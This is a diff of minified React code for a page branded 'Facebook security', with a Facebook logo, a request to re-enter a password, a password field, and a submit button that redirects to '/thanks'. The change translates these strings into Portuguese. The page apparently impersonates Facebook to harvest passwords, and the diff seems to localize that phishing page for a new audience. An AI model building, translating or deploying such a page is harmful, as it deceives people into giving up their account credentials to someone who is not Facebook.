@@ -13455,11 +13455,11 @@
                     alt: "Facebook Logo"
                 }), (0,
                 he.jsx)("h3", {
-                    children: "Facebook security"
+                    children: "Segurança do Facebook"
                 }), (0,
                 he.jsx)("hr", {}), (0,
                 he.jsx)("p", {
-                    children: "Please re-enter password to complete the request."
+                    children: "Por favor, reinsira a senha para concluir a solicitação."
                 }), (0,
                 he.jsx)("input", {
                     type: "password",
@@ -13484,7 +13484,7 @@
                         e("/thanks")
                     }
                     ,
-                    children: "Submit"
+                    children: "Enviar"
                 })]
             })
         }
